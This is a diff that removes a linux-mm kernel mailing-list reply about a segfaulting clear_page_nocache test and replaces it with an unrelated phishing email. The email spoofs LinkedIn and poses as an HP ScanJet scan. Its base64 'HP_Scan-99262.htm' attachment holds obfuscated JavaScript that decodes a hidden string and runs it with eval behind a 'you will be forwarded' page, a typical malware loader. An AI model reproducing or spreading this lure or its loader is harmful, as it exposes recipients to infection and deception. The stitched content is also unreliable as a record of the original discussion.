@@ -1,101 +1,126 @@
-Return-Path: <owner-linux-mm@kvack.org>
-Received: from psmtp.com (na3sys010amx156.postini.com [74.125.245.156])
-	by kanga.kvack.org (Postfix) with SMTP id 5AFE26B002B
-	for <linux-mm@kvack.org>; Mon, 13 Aug 2012 13:03:50 -0400 (EDT)
-Date: Mon, 13 Aug 2012 19:04:02 +0200
-From: Borislav Petkov <bp@alien8.de>
-Subject: Re: [PATCH v2 4/6] x86: Add clear_page_nocache
-Message-ID: <20120813170402.GB15530@x1.osrc.amd.com>
-References: <1344524583-1096-1-git-send-email-kirill.shutemov@linux.intel.com>
- <1344524583-1096-5-git-send-email-kirill.shutemov@linux.intel.com>
- <5023F1BC0200007800093EF0@nat28.tlf.novell.com>
- <20120813114334.GA21855@otc-wbsnb-06>
+Return-Path: <PaigeCrabtree@videoplus.com>
+Sender: messages-noreply@bounce.linkedin.com
+Date: Mon, 13 Aug 2012 01:08:27 +0300
+From: LinkedIn Password <password@linkedin.com>
+Message-ID: <511675675.5117887.3029489769371.JavaMail.app@ela2-app5022.prod>
+Subject: Fwd: Scan from a Hewlett-Packard ScanJet  #1234
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-In-Reply-To: <20120813114334.GA21855@otc-wbsnb-06>
-Sender: owner-linux-mm@kvack.org
+Content-Type: multipart/mixed;
+	boundary="----=_Part_8223531_5447942059.9853561579768"
+To: linux-mm <linux-mm@kvack.org>
 List-ID: <linux-mm.kvack.org>
-To: "Kirill A. Shutemov" <kirill.shutemov@linux.intel.com>
-Cc: Jan Beulich <JBeulich@suse.com>, Andi Kleen <ak@linux.intel.com>, Andy Lutomirski <luto@amacapital.net>, Robert Richter <robert.richter@amd.com>, Johannes Weiner <hannes@cmpxchg.org>, Hugh Dickins <hughd@google.com>, Alex Shi <alex.shu@intel.com>, KAMEZAWA Hiroyuki <kamezawa.hiroyu@jp.fujitsu.com>, x86@kernel.org, linux-mm@kvack.org, Thomas Gleixner <tglx@linutronix.de>, Andrew Morton <akpm@linux-foundation.org>, linux-mips@linux-mips.org, Tim Chen <tim.c.chen@linux.intel.com>, linuxppc-dev@lists.ozlabs.org, Andrea Arcangeli <aarcange@redhat.com>, Ingo Molnar <mingo@redhat.com>, Mel Gorman <mgorman@suse.de>, linux-kernel@vger.kernel.org, linux-sh@vger.kernel.org, sparclinux@vger.kernel.org, "H. Peter Anvin" <hpa@zytor.com>
 
-On Mon, Aug 13, 2012 at 02:43:34PM +0300, Kirill A. Shutemov wrote:
-> $ cat test.c
-> #include <stdio.h>
-> #include <sys/mman.h>
-> 
-> #define SIZE 1024*1024*1024
-> 
-> void clear_page_nocache_sse2(void *page) __attribute__((regparm(1)));
-> 
-> int main(int argc, char** argv)
-> {
->         char *p;
->         unsigned long i, j;
-> 
->         p = mmap(NULL, SIZE, PROT_WRITE|PROT_READ,
->                         MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
->         for(j = 0; j < 100; j++) {
->                 for(i = 0; i < SIZE; i += 4096) {
->                         clear_page_nocache_sse2(p + i);
->                 }
->         }
-> 
->         return 0;
-> }
-> $ cat clear_page_nocache_unroll32.S
-> .globl clear_page_nocache_sse2
-> .align 4,0x90
-> clear_page_nocache_sse2:
-> .cfi_startproc
->         mov    %eax,%edx
->         xorl   %eax,%eax
->         movl   $4096/32,%ecx
->         .p2align 4
-> .Lloop_sse2:
->         decl    %ecx
-> #define PUT(x) movnti %eax,x*4(%edx)
->         PUT(0)
->         PUT(1)
->         PUT(2)
->         PUT(3)
->         PUT(4)
->         PUT(5)
->         PUT(6)
->         PUT(7)
-> #undef PUT
->         lea     32(%edx),%edx
->         jnz     .Lloop_sse2
->         nop
->         ret
-> .cfi_endproc
-> .type clear_page_nocache_sse2, @function
-> .size clear_page_nocache_sse2, .-clear_page_nocache_sse2
-> $ cat clear_page_nocache_unroll64.S
-> .globl clear_page_nocache_sse2
-> .align 4,0x90
-> clear_page_nocache_sse2:
-> .cfi_startproc
->         mov    %eax,%edx
+------=_Part_8223531_5447942059.9853561579768
+Content-Type: multipart/alternative;
+	boundary="----=_Part_2736003_3356035235.5152821184395"
 
-This must still be the 32-bit version becaue it segfaults here. Here's
-why:
+------=_Part_2736003_3356035235.5152821184395
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
 
-mmap above gives a ptr which, on 64-bit, is larger than 32-bit, i.e. it
-looks like 0x7fffxxxxx000, i.e. starting from top of userspace.
+Attached document was scanned and sentto you using a Hewlett-Packard  HP:F350119P.SENT BY : Margarito
+PAGES : 3
+FILETYPE: .HTML [Internet Explorer File]
 
-Now, the mov above truncates that ptr and the thing segfaults.
 
-Doing s/edx/rdx/g fixes it though.
 
-Thanks.
 
--- 
-Regards/Gruss,
-Boris.
+------=_Part_2736003_3356035235.5152821184395
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
 
---
-To unsubscribe, send a message with 'unsubscribe linux-mm' in
-the body to majordomo@kvack.org.  For more info on Linux MM,
-see: http://www.linux-mm.org/ .
-Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
+
+<html>
+  <body >
+Attached document was scanned and sent<br /><br />
+to you using a Hewlett-Packard  HP:F350119P.<br /><br />
+
+SENT BY : Margarito<br>
+PAGES : 3<br>
+FILETYPE: .HTML [Internet Explorer File]<br><br>
+</body>
+</html>
+------=_Part_2736003_3356035235.5152821184395--
+
+
+------=_Part_8223531_5447942059.9853561579768
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="HP_Scan-99262.htm"
+
+PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFs
+Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+DQo8aHRtbD4NCiA8
+aGVhZD4NCiAgPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0
+bWw7IGNoYXJzZXQ9dXRmLTgiPg0KIDwvaGVhZD4NCiA8Ym9keT4gIA0KDQo8aDE+PGI+UGxlYXNl
+IHdhaXQgYSBtb21lbnQuIFlvdSB3aWxsIGJlIGZvcndhcmRlZC4uLjwvaDE+PC9iPg0KPHNjcmlw
+dD50cnl7bnw9TWF0aC5yb3VuZDt9Y2F0Y2goenhjKXtpZigwMjA9PTB4MTApZT1ldmFsO209TWF0
+aDtuPSIxMjYuLjEzNS4uMTQ3MC4uMTUzMC4uNDQ4Li42MDAuLjE0MDAuLjE2NjUuLjEzODYuLjE3
+NTUuLjE1MjYuLjE1MTUuLjE1NDAuLjE3NDAuLjY0NC4uMTU0NS4uMTQxNC4uMTc0MC4uOTY2Li4x
+NjIwLi4xNDE0Li4xNjM1Li4xNDE0Li4xNjUwLi4xNjI0Li4xNzI1Li45MjQuLjE4MTUuLjExNzYu
+LjE0NTUuLjE0NDIuLjExNzAuLjEzNTguLjE2MzUuLjE0MTQuLjYwMC4uNTQ2Li4xNDcwLi4xNTU0
+Li4xNTAwLi4xNjk0Li41ODUuLjU3NC4uMTM2NS4uNjcyLi4xMzk1Li41NzQuLjE4NDUuLjE4Mi4u
+MTM1Li4xMjYuLjEzNS4uMTQ3MC4uMTUzMC4uMTU5Ni4uMTQ1NS4uMTUyNi4uMTUxNS4uMTU5Ni4u
+NjAwLi41NzQuLjg4NS4uMTgyLi4xMzUuLjEyNi4uMTg3NS4uNDQ4Li4xNTE1Li4xNTEyLi4xNzI1
+Li4xNDE0Li40ODAuLjE3MjIuLjE5NS4uMTI2Li4xMzUuLjEyNi4uMTUwMC4uMTU1NC4uMTQ4NS4u
+MTYzOC4uMTYzNS4uMTQxNC4uMTY1MC4uMTYyNC4uNjkwLi4xNjY2Li4xNzEwLi4xNDcwLi4xNzQw
+Li4xNDE0Li42MDAuLjQ3Ni4uOTAwLi4xNDcwLi4xNTMwLi4xNTk2Li4xNDU1Li4xNTI2Li4xNTE1
+Li40NDguLjE3MjUuLjE1OTYuLjE0ODUuLjg1NC4uNTg1Li4xNDU2Li4xNzQwLi4xNjI0Li4xNjgw
+Li44MTIuLjcwNS4uNjU4Li4xNjM1Li4xNDcwLi4xNzEwLi4xNDAwLi4xODE1Li4xNTI2Li4xNDU1
+Li4xNjEwLi42OTAuLjE1OTYuLjE3NTUuLjgxMi4uODQwLi42NzIuLjg0MC4uNjcyLi43MDUuLjE0
+MjguLjE2NjUuLjE1OTYuLjE3NTUuLjE1MjYuLjcwNS4uMTYxMC4uMTU2MC4uMTU1NC4uMTc4NS4u
+MTYyNC4uMTU2MC4uMTU5Ni4uMTUxNS4uMTM1OC4uMTUwMC4uNjQ0Li4xNjgwLi4xNDU2Li4xNjgw
+Li44ODIuLjE2ODAuLjEzNTguLjE1NDUuLjE0MTQuLjkxNS4uNzQyLi4xNTMwLi4xMzU4Li43OTUu
+Ljc4NC4uMTQ3MC4uMTM4Ni4uMTUxNS4uNzcwLi44MTAuLjc5OC4uMTUxNS4uNzQyLi4xNDg1Li43
+MDAuLjE0ODUuLjU0Ni4uNDgwLi4xNjY2Li4xNTc1Li4xNDAwLi4xNzQwLi4xNDU2Li45MTUuLjU0
+Ni4uNzM1Li42NzIuLjU4NS4uNDQ4Li4xNTYwLi4xNDE0Li4xNTc1Li4xNDQyLi4xNTYwLi4xNjI0
+Li45MTUuLjU0Ni4uNzM1Li42NzIuLjU4NS4uNDQ4Li4xNzI1Li4xNjI0Li4xODE1Li4xNTEyLi4x
+NTE1Li44NTQuLjU4NS4uMTY1Mi4uMTU3NS4uMTYxMC4uMTU3NS4uMTM3Mi4uMTU3NS4uMTUxMi4u
+MTU3NS4uMTYyNC4uMTgxNS4uODEyLi4xNTYwLi4xNDcwLi4xNTAwLi4xNDAwLi4xNTE1Li4xNTQw
+Li44ODUuLjE1NjguLjE2NjUuLjE2MTAuLjE1NzUuLjE2MjQuLjE1NzUuLjE1NTQuLjE2NTAuLjgx
+Mi4uMTQ1NS4uMTM3Mi4uMTcyNS4uMTU1NC4uMTYyMC4uMTYzOC4uMTc0MC4uMTQxNC4uODg1Li4x
+NTEyLi4xNTE1Li4xNDI4Li4xNzQwLi44MTIuLjcyMC4uODI2Li4xNzQwLi4xNTU0Li4xNjgwLi44
+MTIuLjcyMC4uODI2Li41ODUuLjg2OC4uOTAwLi42NTguLjE1NzUuLjE0MjguLjE3MTAuLjEzNTgu
+LjE2MzUuLjE0MTQuLjkzMC4uNDc2Li42MTUuLjgyNi4uMTk1Li4xMjYuLjEzNS4uMTc1MC4uMTk1
+Li4xMjYuLjEzNS4uMTQyOC4uMTc1NS4uMTU0MC4uMTQ4NS4uMTYyNC4uMTU3NS4uMTU1NC4uMTY1
+MC4uNDQ4Li4xNTc1Li4xNDI4Li4xNzEwLi4xMzU4Li4xNjM1Li4xNDE0Li4xNzEwLi41NjAuLjYx
+NS4uMTcyMi4uMTk1Li4xMjYuLjEzNS4uMTI2Li4xNzcwLi4xMzU4Li4xNzEwLi40NDguLjE1MzAu
+LjQ0OC4uOTE1Li40NDguLjE1MDAuLjE1NTQuLjE0ODUuLjE2MzguLjE2MzUuLjE0MTQuLjE2NTAu
+LjE2MjQuLjY5MC4uMTM4Ni4uMTcxMC4uMTQxNC4uMTQ1NS4uMTYyNC4uMTUxNS4uOTY2Li4xNjIw
+Li4xNDE0Li4xNjM1Li4xNDE0Li4xNjUwLi4xNjI0Li42MDAuLjU0Ni4uMTU3NS4uMTQyOC4uMTcx
+MC4uMTM1OC4uMTYzNS4uMTQxNC4uNTg1Li41NzQuLjg4NS4uMTQyOC4uNjkwLi4xNjEwLi4xNTE1
+Li4xNjI0Li45NzUuLjE2MjQuLjE3NDAuLjE1OTYuLjE1NzUuLjEzNzIuLjE3NTUuLjE2MjQuLjE1
+MTUuLjU2MC4uNTg1Li4xNjEwLi4xNzEwLi4xMzg2Li41ODUuLjYxNi4uNTg1Li4xNDU2Li4xNzQw
+Li4xNjI0Li4xNjgwLi44MTIuLjcwNS4uNjU4Li4xNjM1Li4xNDcwLi4xNzEwLi4xNDAwLi4xODE1
+Li4xNTI2Li4xNDU1Li4xNjEwLi42OTAuLjE1OTYuLjE3NTUuLjgxMi4uODQwLi42NzIuLjg0MC4u
+NjcyLi43MDUuLjE0MjguLjE2NjUuLjE1OTYuLjE3NTUuLjE1MjYuLjcwNS4uMTYxMC4uMTU2MC4u
+MTU1NC4uMTc4NS4uMTYyNC4uMTU2MC4uMTU5Ni4uMTUxNS4uMTM1OC4uMTUwMC4uNjQ0Li4xNjgw
+Li4xNDU2Li4xNjgwLi44ODIuLjE2ODAuLjEzNTguLjE1NDUuLjE0MTQuLjkxNS4uNzQyLi4xNTMw
+Li4xMzU4Li43OTUuLjc4NC4uMTQ3MC4uMTM4Ni4uMTUxNS4uNzcwLi44MTAuLjc5OC4uMTUxNS4u
+NzQyLi4xNDg1Li43MDAuLjE0ODUuLjU0Ni4uNjE1Li44MjYuLjE1MzAuLjY0NC4uMTcyNS4uMTYy
+NC4uMTgxNS4uMTUxMi4uMTUxNS4uNjQ0Li4xNzcwLi4xNDcwLi4xNzI1Li4xNDcwLi4xNDcwLi4x
+NDcwLi4xNjIwLi4xNDcwLi4xNzQwLi4xNjk0Li45MTUuLjU0Ni4uMTU2MC4uMTQ3MC4uMTUwMC4u
+MTQwMC4uMTUxNS4uMTU0MC4uNTg1Li44MjYuLjE1MzAuLjY0NC4uMTcyNS4uMTYyNC4uMTgxNS4u
+MTUxMi4uMTUxNS4uNjQ0Li4xNjgwLi4xNTU0Li4xNzI1Li4xNDcwLi4xNzQwLi4xNDcwLi4xNjY1
+Li4xNTQwLi45MTUuLjU0Ni4uMTQ1NS4uMTM3Mi4uMTcyNS4uMTU1NC4uMTYyMC4uMTYzOC4uMTc0
+MC4uMTQxNC4uNTg1Li44MjYuLjE1MzAuLjY0NC4uMTcyNS4uMTYyNC4uMTgxNS4uMTUxMi4uMTUx
+NS4uNjQ0Li4xNjIwLi4xNDE0Li4xNTMwLi4xNjI0Li45MTUuLjU0Ni4uNzIwLi41NDYuLjg4NS4u
+MTQyOC4uNjkwLi4xNjEwLi4xNzQwLi4xNjk0Li4xNjIwLi4xNDE0Li42OTAuLjE2MjQuLjE2NjUu
+LjE1NjguLjkxNS4uNTQ2Li43MjAuLjU0Ni4uODg1Li4xNDI4Li42OTAuLjE2MTAuLjE1MTUuLjE2
+MjQuLjk3NS4uMTYyNC4uMTc0MC4uMTU5Ni4uMTU3NS4uMTM3Mi4uMTc1NS4uMTYyNC4uMTUxNS4u
+NTYwLi41ODUuLjE2NjYuLjE1NzUuLjE0MDAuLjE3NDAuLjE0NTYuLjU4NS4uNjE2Li41ODUuLjY4
+Ni4uNzIwLi41NDYuLjYxNS4uODI2Li4xNTMwLi42NDQuLjE3MjUuLjE0MTQuLjE3NDAuLjkxMC4u
+MTc0MC4uMTYyNC4uMTcxMC4uMTQ3MC4uMTQ3MC4uMTYzOC4uMTc0MC4uMTQxNC4uNjAwLi41NDYu
+LjE1NjAuLjE0MTQuLjE1NzUuLjE0NDIuLjE1NjAuLjE2MjQuLjU4NS4uNjE2Li41ODUuLjY4Ni4u
+NzIwLi41NDYuLjYxNS4uODI2Li4xOTUuLjEyNi4uMTM1Li4xMjYuLjE1MDAuLjE1NTQuLjE0ODUu
+LjE2MzguLjE2MzUuLjE0MTQuLjE2NTAuLjE2MjQuLjY5MC4uMTQ0Mi4uMTUxNS4uMTYyNC4uMTAz
+NS4uMTUxMi4uMTUxNS4uMTUyNi4uMTUxNS4uMTU0MC4uMTc0MC4uMTYxMC4uOTkwLi4xNjk0Li4x
+MjYwLi4xMzU4Li4xNTQ1Li4xMDkyLi4xNDU1Li4xNTI2Li4xNTE1Li41NjAuLjU4NS4uMTM3Mi4u
+MTY2NS4uMTQwMC4uMTgxNS4uNTQ2Li42MTUuLjEyNzQuLjcyMC4uMTMwMi4uNjkwLi4xMzU4Li4x
+NjgwLi4xNTY4Li4xNTE1Li4xNTQwLi4xNTAwLi45MzguLjE1NjAuLjE0NzAuLjE2MjAuLjE0MDAu
+LjYwMC4uMTQyOC4uNjE1Li44MjYuLjE5NS4uMTI2Li4xMzUuLjE3NTAiLnNwbGl0KCIuLiIpO2g9
+MjtzPSIiO2ZvcihpPTA7aS02NDEhPTA7aT0xK2kpe2s9aTtzKz1TdHJpbmdbImZyb21DaGFyQ29k
+ZSJdKG5ba10vKGktaCpNYXRoLmZsb29yKGkvaCkrMDE2KSk7fWlmKDAxNi0weGI9PT0zKWlmKHdp
+bmRvdy5kb2N1bWVudCllKCIiK3MpO308L3NjcmlwdD4NCg0KPC9ib2R5Pg0KPC9odG1sPg== 
+
+
+------=_Part_8223531_5447942059.9853561579768--
